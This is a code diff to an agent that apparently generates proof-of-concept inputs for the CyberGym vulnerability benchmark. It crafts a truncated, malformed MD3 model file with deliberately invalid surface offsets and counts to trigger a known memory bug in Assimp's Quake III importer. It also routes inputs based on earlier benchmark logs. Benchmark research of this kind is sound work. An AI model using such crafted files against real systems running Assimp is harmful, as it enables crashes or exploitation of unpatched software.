@@ -19,6 +19,7 @@ import io
 import json
 import os
 import re
+import struct
 import tarfile
 from typing import Any, Mapping
 
@@ -170,7 +171,7 @@ PI_BENCH_FIELD_MARKERS = (
     "decision_valid",
 )
 
-CYBERGYM_CONTRACT_VERSION = "cybergym_contract_v0_7_assimp_md3_arvo_stress_poc"
+CYBERGYM_CONTRACT_VERSION = "cybergym_contract_v0_8_assimp_md3_surface_offsets_arvo_stress_poc"
 
 CYBERGYM_FILE_MARKERS = {
     "repo-vul.tar.gz",
@@ -540,77 +541,92 @@ class Executor(AgentExecutor):
     
     @staticmethod
     def _cybergym_seed_md3_quake3() -> bytes:
-        """Assimp MD3 / Quake III Mesh Importer seed.
+        """Assimp MD3 / Quake III seed targeting MD3 surface-offset parsing.
 
-        The observed successful path for oss-fuzz:42535201 reached:
-        Assimp::MD3Importer::ConvertPath
-        so the default Assimp fallback should try MD3 before Collada/FBX/PLY.
+        Goal:
+        - pass Assimp's extensionless signature detection with IDP3/version 15;
+        - keep the top-level MD3 header plausible;
+        - push malformed surface-offset handling toward MD3Importer paths such as
+          ValidateSurfaceHeaderOffsets / ConvertPath, while remaining deterministic.
         """
-        buf = bytearray()
+        def u32(value: int) -> bytes:
+            return int(value & 0xFFFFFFFF).to_bytes(4, "little", signed=False)
 
-        # MD3 header:
-        # ident = "IDP3", version = 15
-        buf.extend(b"IDP3")
-        buf.extend((15).to_bytes(4, "little", signed=True))
+        def i32(value: int) -> bytes:
+            return int(value).to_bytes(4, "little", signed=True)
 
-        # name[64]
-        name = b"aegisforge_" + b"A" * 53
-        buf.extend(name[:64].ljust(64, b"\x00"))
+        def f32(value: float) -> bytes:
+            return struct.pack("<f", float(value))
 
-        # flags, numFrames, numTags, numSurfaces, numSkins
-        buf.extend((0).to_bytes(4, "little", signed=True))
-        buf.extend((1).to_bytes(4, "little", signed=True))
-        buf.extend((1).to_bytes(4, "little", signed=True))
-        buf.extend((1).to_bytes(4, "little", signed=True))
-        buf.extend((0).to_bytes(4, "little", signed=True))
-
-        # ofsFrames, ofsTags, ofsSurfaces, ofsEnd
+        # MD3 header is 108 bytes:
+        # IDENT, VERSION, NAME[64], FLAGS, NUM_FRAMES, NUM_TAGS, NUM_SURFACES,
+        # NUM_SKINS, OFS_FRAMES, OFS_TAGS, OFS_SURFACES, OFS_EOF.
         ofs_frames = 108
         ofs_tags = ofs_frames + 56
         ofs_surfaces = ofs_tags + 112
-        ofs_end = ofs_surfaces + 512
-        for value in (ofs_frames, ofs_tags, ofs_surfaces, ofs_end):
-            buf.extend(int(value).to_bytes(4, "little", signed=True))
 
-        # Frame: mins[3], maxs[3], localOrigin[3], radius, name[16]
-        for value in (-2147483648, -2147483648, -2147483648, 2147483647, 2147483647, 2147483647, 0, 0, 0, 2147483647):
-            buf.extend(float(value).hex().encode("ascii")[:4].ljust(4, b"\x00"))
+        # Keep EOF small enough that a full Surface header does not fit.
+        # Vulnerable builds are expected to touch surface fields before enough
+        # bounds validation; fixed builds should reject this cleanly.
+        ofs_eof = ofs_surfaces + 24
+
+        buf = bytearray()
+        buf.extend(b"IDP3")
+        buf.extend(u32(15))
+        buf.extend(b"aegisforge_md3_surface_offsets".ljust(64, b"\x00"))
+
+        buf.extend(i32(0))       # FLAGS
+        buf.extend(u32(1))       # NUM_FRAMES
+        buf.extend(u32(1))       # NUM_TAGS
+        buf.extend(u32(1))       # NUM_SURFACES
+        buf.extend(u32(0))       # NUM_SKINS
+        buf.extend(u32(ofs_frames))
+        buf.extend(u32(ofs_tags))
+        buf.extend(u32(ofs_surfaces))
+        buf.extend(u32(ofs_eof))
+
+        # Frame: min[3], max[3], origin[3], radius, name[16].
+        # Use real IEEE754 little-endian floats, not ASCII float fragments.
+        for value in (
+            -1.0, -1.0, -1.0,
+            1.0, 1.0, 1.0,
+            0.0, 0.0, 0.0,
+            1.0,
+        ):
+            buf.extend(f32(value))
         buf.extend(b"frame0".ljust(16, b"\x00"))
 
-        # Tag: name[64], origin[3], axis[3][3]
-        buf.extend((b"../" * 21)[:64].ljust(64, b"\x00"))
-        buf.extend(b"\x00" * 48)
+        # Tag: name[64], origin[3], axis[3][3].
+        buf.extend(b"tag_torso".ljust(64, b"\x00"))
+        for value in (
+            0.0, 0.0, 0.0,
+            1.0, 0.0, 0.0,
+            0.0, 1.0, 0.0,
+            0.0, 0.0, 1.0,
+        ):
+            buf.extend(f32(value))
 
-        # Surface header-ish block.
-        surface = bytearray()
-        surface.extend(b"IDP3")
-        surface.extend((b"../../../../" + b"A" * 56)[:64].ljust(64, b"\x00"))
+        # Partial Surface header. This intentionally leaves the Surface object
+        # truncated relative to sizeof(MD3::Surface), while beginning with the
+        # correct surface magic.
+        buf.extend(b"IDP3")
+        buf.extend((b"models/players/aegisforge/" + b"A" * 80)[:64].ljust(64, b"\x00"))
 
-        # flags, numFrames, numShaders, numVerts, numTriangles
-        for value in (0, 1, 1, 3, 1):
-            surface.extend(int(value).to_bytes(4, "little", signed=True))
+        # Add a few malformed numeric fields if the vulnerable build reads them.
+        buf.extend(i32(0))              # FLAGS
+        buf.extend(u32(1))              # NUM_FRAMES
+        buf.extend(u32(1))              # NUM_SHADER
+        buf.extend(u32(4096))           # NUM_VERTICES
+        buf.extend(u32(8192))           # NUM_TRIANGLES
+        buf.extend(u32(0x7FFFFFF0))     # OFS_TRIANGLES, intentionally bad
+        buf.extend(u32(0x7FFFFFE0))     # OFS_SHADERS, intentionally bad
 
-        # ofsTriangles, ofsShaders, ofsST, ofsXYZNormal, ofsEnd
-        for value in (108, 120, 188, 212, 512):
-            surface.extend(int(value).to_bytes(4, "little", signed=True))
+        # Truncate to the declared EOF. This is the key difference from the
+        # previous v0.7 MD3 seed, which created a larger mostly padded blob.
+        if len(buf) < ofs_eof:
+            buf.extend(b"\x00" * (ofs_eof - len(buf)))
 
-        # Triangle indexes
-        surface.extend((0).to_bytes(4, "little", signed=True))
-        surface.extend((1).to_bytes(4, "little", signed=True))
-        surface.extend((2147483647).to_bytes(4, "little", signed=True))
-
-        # Shader name[64] + index
-        surface.extend((b"textures/" + b"B" * 55)[:64].ljust(64, b"\x00"))
-        surface.extend((0).to_bytes(4, "little", signed=True))
-
-        # ST coords and XYZ/normal data
-        surface.extend(b"\x00" * 256)
-
-        buf.extend(surface)
-        if len(buf) < ofs_end:
-            buf.extend(b"\x00" * (ofs_end - len(buf)))
-
-        return bytes(buf[:CYBERGYM_MAX_POC_BYTES])
+        return bytes(buf[:ofs_eof])[:CYBERGYM_MAX_POC_BYTES]
     
     @staticmethod
     def _cybergym_seed_assimp_signature_probe() -> bytes:
@@ -953,10 +969,10 @@ class Executor(AgentExecutor):
         ):
             return self._cybergym_seed_assembly_stress()[:CYBERGYM_MAX_POC_BYTES]
 
-        # Assimp's fuzzer often receives /tmp/poc with no extension. The v0.2
-        # executor had the safer answer for one Assimp task by falling back to
-        # Collada/XML instead of the later FBX signature probe. Keep explicit
-        # STL/PLY/FBX/Collada signals, but restore Collada as the no-hint default.
+        # Assimp's fuzzer receives /tmp/poc with no extension, so the input must
+        # pass content-based signature detection. For oss-fuzz:42535201, prior
+        # logs point toward the Quake III / MD3 importer, and public Assimp data
+        # points to malformed MD3 surface-offset parsing as the useful path.
         if self._cybergym_contains_any(
             low,
             (
@@ -1170,7 +1186,7 @@ class Executor(AgentExecutor):
         # over a fixed placeholder so the input has a chance to pass early gates.
         magic_tokens = self._cybergym_collect_magic_tokens(probe_blob)
         generic = bytearray()
-        generic.extend(b"AEGISFORGE_CYBERGYM_CONTEXTUAL_SEED_V0_6\n")
+        generic.extend(b"AEGISFORGE_CYBERGYM_CONTEXTUAL_SEED_V0_8\n")
         for token in magic_tokens:
             generic.extend(token[:64] + b"\n")
         generic.extend(
@@ -1200,11 +1216,12 @@ class Executor(AgentExecutor):
         context_id: str,
         task_id: str,
     ) -> None:
-        """CyberGym v0.7: submit a final-PoC artifact with contextual bytes.
+        """CyberGym v0.8: submit a final-PoC artifact with contextual bytes.
 
-        v0 proved the artifact contract. v0.7 keeps the same final Artifact(name="PoC")
+        v0 proved the artifact contract. v0.8 keeps the same final Artifact(name="PoC")
         / FilePart(name="poc") shape, preserves ARVO assembly_stress, and changes
-        the Assimp extensionless fallback to MD3 / Quake III Mesh Importer.
+        the Assimp extensionless fallback to a structurally valid MD3 surface-offset
+        probe for Quake III Mesh Importer.
         """
             
         files = self._cybergym_extract_files(message)
@@ -1227,7 +1244,7 @@ class Executor(AgentExecutor):
         await updater.update_status(
             TaskState.working,
             new_agent_text_message(
-                f"CyberGym contract v0.7: submitting contextual PoC artifact ({len(poc)} bytes; files={filenames}).",
+                f"CyberGym contract v0.8: submitting contextual PoC artifact ({len(poc)} bytes; files={filenames}).",
                 context_id=context_id,
                 task_id=task_id,
             ),
